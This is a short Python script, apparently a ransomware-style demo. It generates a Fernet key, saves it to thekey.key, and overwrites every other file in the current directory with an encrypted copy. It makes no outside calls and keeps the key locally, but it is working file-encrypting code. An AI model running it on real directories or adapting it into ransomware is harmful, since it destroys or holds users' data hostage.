import os
from cryptography.fernet import Fernet as f
import time
from tqdm import tqdm

files=[] 
for file in os.listdir():
   if file=="encrypt_everything.py" or file=="thekey.key" or file=="decrypt_everything.py":
      continue
   if os.path.isfile(file):
      files.append(file)

key=f.generate_key()
with open("thekey.key",'wb') as thekey:
   thekey.write(key)



for file in files:
   with open(file,'rb') as thefile:
      contents=thefile.read()
   contents_encrypted=f(key).encrypt(contents)
   with tqdm.wrapattr(open(file,'wb'), "write", total=len(contents_encrypted),desc=file,colour="green") as r_raw:
      r_raw.write(contents_encrypted)
   print('\n')